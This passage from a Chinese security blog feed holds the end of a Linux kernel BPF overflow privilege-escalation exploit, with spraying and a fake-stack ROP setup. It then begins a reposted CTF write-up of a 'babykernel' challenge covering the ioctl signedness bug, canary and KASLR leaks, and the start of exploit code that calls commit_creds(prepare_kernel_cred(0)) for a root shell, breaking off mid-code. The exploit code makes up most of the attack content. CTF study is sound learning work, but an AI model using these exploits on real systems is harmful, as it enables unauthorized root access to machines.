class="line">        <span class="built_in">snprintf</span>(name, <span class="number">100</span>, <span class="string">"xxx%d"</span>, i);</span><br><span class="line">        fp=fopen(name,<span class="string">"w"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//signal(SIGSEGV,get_shell);</span></span><br><span class="line">  syscall(__NR_mmap, <span class="number">0x20000000</span>, <span class="number">0x1000000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c0</span> = <span class="number">0x17</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c4</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c8</span> = <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011cc</span> = <span class="number">-1</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d0</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d4</span> = <span class="number">-1</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dc</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dd</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011de</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011df</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e0</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e1</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e2</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e3</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e4</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e5</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e6</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e7</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e9</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011ea</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011eb</span> = <span class="number">0</span>;</span><br><span class="line">  save_state();</span><br><span class="line">  prepare_krop();</span><br><span class="line">  res = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">    r[<span class="number">0</span>] = res;</span><br><span class="line">  spray();</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200000c0</span> = r[<span class="number">0</span>];</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000c8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d0</span> = <span class="number">0x20000140</span>;</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d8</span> = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)<span class="number">0x20000140</span>;</span><br><span class="line">  ptr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">  ptr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">  ptr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">  ptr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line">  ptr[<span class="number">4</span>]=<span class="number">5</span>;</span><br><span class="line">  ptr[<span class="number">5</span>]=<span class="number">6</span>;</span><br><span class="line">  ptr[<span class="number">6</span>]=<span class="number">0xa000000000</span>;</span><br><span class="line">  ptr[<span class="number">7</span>]=<span class="number">8</span>;</span><br><span class="line">  syscall(__NR_bpf, <span class="number">2</span>, <span class="number">0x200000c0</span>, <span class="number">0x20</span>);</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">      close(victim[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//pause();</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文献：</p><p><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">P4nda 师傅</a></p><p><a href="https://www.anquanke.com/post/id/166819#h3-5" target="_blank" rel="noopener">原作者 ww9210师傅</a></p><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE" target="_blank" rel="noopener">ww9210 师傅的 github</a></p><p><a href="https://www.kernel.org/doc/html/latest/bpf/index.html" target="_blank" rel="noopener">bpf</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载自360安全客)从高校战疫的两道kernel学习kernel</title>
      <link href="/2020/03/14/(%E8%BD%AC%E8%BD%BD%E8%87%AA360%E5%AE%89%E5%85%A8%E5%AE%A2)%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%9A%84%E4%B8%A4%E9%81%93kernel/"/>
      <url>/2020/03/14/(%E8%BD%AC%E8%BD%BD%E8%87%AA360%E5%AE%89%E5%85%A8%E5%AE%A2)%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%9A%84%E4%B8%A4%E9%81%93kernel/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a>这次比赛的两道kernel题，解包都可以获得flag，而且跟网上最流行的两道联系的题是如此的类似似。比赛的时候没有看，赛后复现了这两道题。<h2 id="1、babykernel"><a href="#1、babykernel" class="headerlink" title="1、babykernel"></a>1、babykernel</h2><h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">badyhacker.ko</span><br><span class="line">bzImage</span><br><span class="line">initramfs.cpio</span><br><span class="line">startvm.sh</span><br></pre></td></tr></table></figure><p>只有这四个文件，vmlinux可以从bzImage提取出来<br>startvm.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stty intr ^]</span></span><br><span class="line"><span class="comment">#cd `dirname $0`</span></span><br><span class="line">timeout --foreground 15 qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>文件开了 smep和smap 保护<br>一个是内核不能访问用户空间的数据<br>一个是内核不能执行用户空间的代码 // 这个可以通过修改rc4寄存器的值改变<br>同时 也开了 kaslr 这个可以通过偏移和泄露来计算<br>系统开了计时，只有15秒。调试的时候得去掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line"></span><br><span class="line">bin  etc   gen_cpio.sh  init            linuxrc  sbin  tmp</span><br><span class="line">dev  flag  home         initramfs.cpio  proc     sys   usr</span><br></pre></td></tr></table></figure><p>一般的配置文件都放 <code>etc/init.d</code> 的rcS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">───────┬───────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: rcS</span><br><span class="line">───────┼───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ <span class="built_in">cd</span> /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">       │ File: rcS</span><br><span class="line">───────┼───────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ <span class="built_in">cd</span> /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">  18   │ chown -R 1000:1000 .</span><br><span class="line">  19   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ poweroff -f</span><br></pre></td></tr></table></figure><p>容易看出系统加载了 babyhacker.ko 这个驱动<br><code>kptr_restrict</code> 和 <code>dmesg_restrict</code> 都为0<br>变量kptr_restrict是可以用来限制内核地址的打印，当kptr_restrict=0时，会直接打印内核地址（%p和%pK效果一样）；当kptr_restrict=1时，若在中断上下文或软中断时，%pK打印“pK-error”，否则内核地址打印全0；当kptr_restrict=2时，%pK打印内核地址为全0；<br>dmesg能够输出kernel ring buffer中的内容，这些内容中可能会包含一些敏感信息<br>我们可以通过设置内核参数 dmesg_restrict 为 1 的方式来禁止普通用户查看demsg信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/kallsyms | grep commit_cr</span><br><span class="line">ffffffff810a1430 T commit_creds</span><br><span class="line"></span><br><span class="line">/ $ cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff810a1820 T prepare_kernel_cred</span><br><span class="line"></span><br><span class="line">commit_creds(prepare_kernel_cred(0))达到提权的效果</span><br></pre></td></tr></table></figure><p>在babyhacker_ioctl出现bug，size改成负数，可以越界访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      read(rdx1, *(__int64 *)&amp;cmd, (<span class="keyword">unsigned</span> __int64)rdx1, (__int64)&amp;v9);<span class="comment">// 从用户读</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);<span class="comment">//写给用户</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)rdx1 &gt;= <span class="number">0xB</span> ) <span class="meta"># this</span></span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">.text:<span class="number">000000000000009</span>D                 cmp     edx, <span class="number">0B</span>h</span><br><span class="line">.text:<span class="number">00000000000000</span>A0                 mov     eax, <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">00000000000000</span>A5                 cmovge  edi, eax</span><br><span class="line">.text:<span class="number">00000000000000</span>A8                 mov     cs:buffersize, di <span class="comment">//16位的</span></span><br><span class="line">.text:<span class="number">00000000000000</span>AF                 jmp     <span class="keyword">short</span> loc_8A</span><br></pre></td></tr></table></figure><p>说明负数后面的的两个字节是决定size</p><p>读写都有了，然后又可以越界，那是不是可以rop了。真爽！</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先把 kaslr关了<br>找打驱动加载的基地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ lsmod</span><br><span class="line">babyhacker 2104 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure><p>先构造 size，看看canary在哪个位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fd error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">ioctl(fd,<span class="number">0x30000</span>,<span class="number">0x80000100</span>);</span><br><span class="line"><span class="keyword">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">ioctl(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line"><span class="keyword">size_t</span> * buf_c = (<span class="keyword">size_t</span> *)buf;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"idx:%d value:0x%lx\n"</span>,i,buf_c[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调试的时候可以getchar()截住下面程序，让程序进入等待状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">idx:0 value:0xffffc90000135288</span><br><span class="line">idx:1 value:0xffff88001db1a980</span><br><span class="line">idx:2 value:0xffff88001d4e6200</span><br><span class="line">idx:3 value:0xffff88001db15cd8</span><br><span class="line">idx:4 value:0x24280ca</span><br><span class="line">idx:5 value:0x0</span><br><span class="line">idx:6 value:0x7fffffffffffffff</span><br><span class="line">idx:7 value:0xfff</span><br><span class="line">idx:8 value:0xe11d5dc4776f2cbf</span><br><span class="line">idx:9 value:0x943891</span><br><span class="line">idx:10 value:0x0</span><br><span class="line">idx:11 value:0xffff88001db1a980</span><br><span class="line">idx:12 value:0xffffffff810c31d0</span><br><span class="line">idx:13 value:0xdead000000000100</span><br><span class="line">idx:14 value:0xdead000000000200</span><br><span class="line">idx:15 value:0xe11d5dc4776f2cbf</span><br><span class="line">idx:16 value:0xffff88001db15c00</span><br><span class="line">idx:17 value:0xfffffffffffffffb</span><br><span class="line">idx:18 value:0xffff88001e3b21a8</span><br><span class="line">idx:19 value:0xffff88001d4e6200</span><br><span class="line">idx:20 value:0xffffffff814e5716</span><br><span class="line">idx:21 value:0xffff88001d4e3e40</span><br><span class="line">idx:22 value:0xffffffff814dd676</span><br><span class="line">idx:23 value:0xffff88001e059350</span><br><span class="line">idx:24 value:0x943890</span><br><span class="line">idx:25 value:0xffff88001d4e6200</span><br><span class="line">idx:26 value:0xffff88001d4e3f18</span><br></pre></td></tr></table></figure><p>随便找个断点下，能断下就OK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─[0] &lt;&gt; gdb vmlinux </span><br><span class="line">pwndbg: loaded 180 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from vmlinux...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt; add-symbol-file ./</span><br><span class="line">.gdb_history    bzImage         initramfs.cpio  startvm.sh      </span><br><span class="line">babyhacker.ko   core/           rop.txt         vmlinux         </span><br><span class="line">pwndbg&gt; add-symbol-file ./</span><br><span class="line">.gdb_history    bzImage         initramfs.cpio  startvm.sh      </span><br><span class="line">babyhacker.ko   core/           rop.txt         vmlinux         </span><br><span class="line">pwndbg&gt; add-symbol-file babyhacker.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;babyhacker.ko&quot; at</span><br><span class="line">.text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from babyhacker.ko...done.</span><br><span class="line">pwndbg&gt; b *0xffffffffc0000000+0x35</span><br><span class="line">Breakpoint 1 at 0xffffffffc0000035: file /home/zoe/Desktop/kernel_pwn/myko/babyhacker.c, line 50.</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RBP  0xffff88001d4e3d40 ◂— 0</span><br><span class="line">RSP  0xffff88001d4e3bf8 ◂— 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg 0xffff88001d4e3d40-0x8</span><br><span class="line">0xffff88001d4e3d38:0xe11d5dc4776f2cbf0x0000000000000000</span><br><span class="line">可以看出 0xe11d5dc4776f2cbf 找个就是 canary</span><br><span class="line">然后 可以利用其它的内核地址就可以 得出offset 就用绕过kaslr</span><br></pre></td></tr></table></figure><p>既然知道 canary，下面就是找出偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000000B8                 lea     cmd, [rbp-148h]</span><br><span class="line">.text:00000000000000BF                 call    _copy_to_user</span><br><span class="line">所以整个数组大小应该是140byte</span><br><span class="line">rbp前面就是canary</span><br></pre></td></tr></table></figure><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>做内核题，一般少不了对程序状态的保存<br>因为在用户空间返回内核空间的是时候要恢复状态，就有点像中断进入内核，然后保存状态。出来再把状态恢复。<br>因为要改rc4，肯定少不了 <code>pop rdi; ret;</code>和<code>mov cr4, rdi; pop rbp; ret;</code> 这两条执行。</p><p>从用户空间回到内核空间需要 <code>swapgs</code> 和 <code>iretq</code><br>具体流程就是：<br>修改size<br>读取数据找到cananry和offset<br>写rop<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds =<span class="number">0xffffffff810a1430</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred =<span class="number">0xffffffff810a1820</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"suceess\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"get shell fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp, rsp;"</span></span><br><span 